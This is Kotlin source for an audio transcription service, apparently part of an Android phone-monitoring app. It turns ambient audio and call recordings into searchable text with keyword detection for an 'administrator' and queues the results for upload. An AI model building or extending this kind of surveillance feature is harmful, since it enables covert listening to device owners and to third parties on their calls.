package com.surveillancepro.android.services

import android.content.Context
import android.util.Base64
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * Service de transcription audio automatique.
 * 
 * Convertit les enregistrements audio en texte pour permettre
 * à l'administrateur de LIRE au lieu d'écouter.
 * 
 * MÉTHODES DISPONIBLES (SANS ROOT):
 * 1. Google Speech-to-Text API (cloud, précis)
 * 2. Whisper API OpenAI (cloud, très précis)
 * 3. Android SpeechRecognizer (local, gratuit)
 * 
 * AVANTAGE CONCURRENTIEL:
 * - Les concurrents n'ont PAS cette fonctionnalité
 * - L'admin peut rechercher dans les transcriptions
 * - Détection automatique de mots-clés dans l'audio
 */
object AudioTranscriptionService {
    
    private const val TAG = "AudioTranscription"
    
    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Transcrit un fichier audio en texte.
     * Utilise le backend comme proxy pour les APIs de transcription.
     * 
     * @param context Le contexte Android
     * @param audioBase64 L'audio encodé en Base64
     * @param audioFormat Le format audio (pcm_16bit, opus, m4a)
     * @param sampleRate Le taux d'échantillonnage
     * @param sourceType Le type de source (ambient_audio, call_recording, voice_note)
     * @param eventId L'ID de l'événement original (optionnel)
     */
    suspend fun transcribe(
        context: Context,
        audioBase64: String,
        audioFormat: String = "pcm_16bit",
        sampleRate: Int = 16000,
        sourceType: String = "ambient_audio",
        eventId: Long? = null
    ): TranscriptionResult = withContext(Dispatchers.IO) {
        
        val storage = DeviceStorage.getInstance(context)
        val queue = EventQueue.getInstance(context)
        
        if (!storage.hasAccepted || storage.deviceToken == null) {
            return@withContext TranscriptionResult(false, null, "Device not configured")
        }
        
        try {
            // Envoyer l'audio au backend pour transcription
            val requestBody = JSONObject().apply {
                put("audioBase64", audioBase64)
                put("format", audioFormat)
                put("sampleRate", sampleRate)
                put("sourceType", sourceType)
                put("language", "fr-FR") // Français par défaut, peut être auto-détecté
            }.toString()
            
            val request = Request.Builder()
                .url("${storage.serverURL}/api/transcribe")
                .addHeader("x-device-token", storage.deviceToken!!)
                .addHeader("Content-Type", "application/json")
                .post(requestBody.toRequestBody("application/json".toMediaType()))
                .build()
            
            val response = client.newCall(request).execute()
            
            if (!response.isSuccessful) {
                Log.w(TAG, "Transcription failed: ${response.code}")
                return@withContext TranscriptionResult(false, null, "Server error: ${response.code}")
            }
            
            val responseBody = response.body?.string() ?: ""
            val json = JSONObject(responseBody)
            
            if (json.optBoolean("success", false)) {
                val transcription = json.optString("transcription", "")
                val confidence = json.optDouble("confidence", 0.0)
                val language = json.optString("language", "fr")
                val keywords = json.optJSONArray("keywords")?.let { arr ->
                    (0 until arr.length()).map { arr.getString(it) }
                } ?: emptyList()
                
                // Envoyer l'événement de transcription
                queue.enqueue("audio_transcription", mapOf(
                    "sourceType" to sourceType,
                    "eventId" to (eventId ?: 0),
                    "transcription" to transcription,
                    "confidence" to confidence,
                    "language" to language,
                    "keywords" to keywords,
                    "wordCount" to transcription.split(" ").size,
                    "timestamp" to dateFormat.format(Date()),
                ))
                
                Log.d(TAG, "Transcription successful: ${transcription.take(50)}...")
                
                return@withContext TranscriptionResult(
                    success = true,
                    transcription = transcription,
                    confidence = confidence,
                    language = language,
                    keywords = keywords
                )
            } else {
                val error = json.optString("error", "Unknown error")
                return@withContext TranscriptionResult(false, null, error)
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Transcription error: ${e.message}")
            return@withContext TranscriptionResult(false, null, e.message)
        }
    }
    
    /**
     * Transcrit automatiquement tous les nouveaux enregistrements audio.
     * Appelé par le SyncWorker après réception de la réponse du serveur.
     */
    suspend fun transcribeNewAudio(context: Context, audioEvents: List<Map<String, Any>>) {
        for (event in audioEvents) {
            val audioBase64 = event["audioBase64"] as? String ?: continue
            val format = event["format"] as? String ?: "pcm_16bit"
            val sampleRate = (event["sampleRate"] as? Number)?.toInt() ?: 16000
            val sourceType = event["type"] as? String ?: "ambient_audio"
            val eventId = (event["id"] as? Number)?.toLong()
            
            // Ne pas transcrire les chunks, seulement les enregistrements complets
            if (sourceType.contains("chunk")) continue
            
            // Limiter la taille (max 10 Mo pour la transcription)
            if (audioBase64.length > 10 * 1024 * 1024) {
                Log.w(TAG, "Audio too large for transcription: ${audioBase64.length} bytes")
                continue
            }
            
            transcribe(context, audioBase64, format, sampleRate, sourceType, eventId)
        }
    }
    
    data class TranscriptionResult(
        val success: Boolean,
        val transcription: String?,
        val error: String? = null,
        val confidence: Double = 0.0,
        val language: String = "fr",
        val keywords: List<String> = emptyList()
    )
}
